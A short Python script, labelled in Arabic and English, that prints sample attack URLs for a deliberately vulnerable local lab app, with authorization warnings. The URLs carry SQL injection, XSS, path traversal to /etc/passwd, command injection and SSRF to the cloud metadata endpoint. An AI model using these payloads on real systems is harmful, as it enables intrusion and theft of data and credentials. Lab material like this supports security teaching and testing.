#!/usr/bin/env python3

"""
عرض مختصر للروابط المصابة الرئيسية
Brief display of main vulnerable URLs
"""

def show_infected_links():
    """Display the main infected links"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                        الروابط المصابة الرئيسية                           ║
║                         Main Infected Links                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    infected_links = {
        "تطبيق تجريبي عرضة للاختراق": {
            "base_url": "http://127.0.0.1:5000",
            "ملاحظة": "يجب تشغيل vulnerable_app.py أولاً"
        },
        
        "SQL Injection (اختراق قاعدة البيانات)": {
            "الرابط": "http://127.0.0.1:5000/user?id=1' UNION SELECT 1,2,3,4--",
            "الوصف": "يسمح باستخراج البيانات من قاعدة البيانات",
            "الخطورة": "عالية جداً"
        },
        
        "XSS (تنفيذ أكواد خبيثة)": {
            "الرابط": "http://127.0.0.1:5000/search?q=<script>alert('XSS')</script>",
            "الوصف": "تنفيذ أكواد JavaScript خبيثة في المتصفح",
            "الخطورة": "متوسطة"
        },
        
        "LFI (قراءة ملفات النظام)": {
            "الرابط": "http://127.0.0.1:5000/include?file=../../../../etc/passwd",
            "الوصف": "قراءة ملفات النظام الحساسة مثل ملفات المستخدمين",
            "الخطورة": "عالية جداً"
        },
        
        "Command Injection (تنفيذ أوامر نظام)": {
            "الرابط": "http://127.0.0.1:5000/execute?cmd=id;whoami;ls -la",
            "الوصف": "تنفيذ أوامر نظام مباشرة على الخادم",
            "الخطورة": "حرجة"
        },
        
        "SSRF (طلبات مزيفة من الخادم)": {
            "الرابط": "http://127.0.0.1:5000/fetch?url=http://169.254.169.254/latest/meta-data/",
            "الوصف": "الوصول إلى خدمات AWS الداخلية والشبكات الداخلية",
            "الخطورة": "عالية جداً"
        }
    }
    
    for category, info in infected_links.items():
        print(f"\n[🎯] {category}:")
        for key, value in info.items():
            if key == "الرابط":
                print(f"   • {key}: {value}")
            elif key == "base_url":
                print(f"   • الرابط الأساسي: {value}")
            else:
                print(f"   • {key}: {value}")
    
    print("\n" + "="*80)
    print("[⚠️] تحذيرات مهمة:")
    print("="*80)
    print("• هذه الروابط مخصصة للتعليم والاختبار المصرح به فقط")
    print("• لا تحاول استخدامها على أنظمة لا تملكها أو ليس لديك تصريح باختبارها")
    print("• دائماً احصل على إذن كتابي قبل إجراء أي اختبار اختراق")
    print("• الاستخدام غير المصرح به قد يعرضك للمسؤولية القانونية")
    print("="*80)

def main():
    show_infected_links()
    
    print("\n[🚀] للبدء:")
    print("1. تشغيل التطبيق العرضة: python vulnerable_app.py")
    print("2. اختبار الروابط المصابة باستخدام: python poc_exploiter.py http://127.0.0.1:5000")
    print("3. أو فتح الروابط مباشرة في المتصفح أو باستخدام curl")

if __name__ == "__main__":
    main()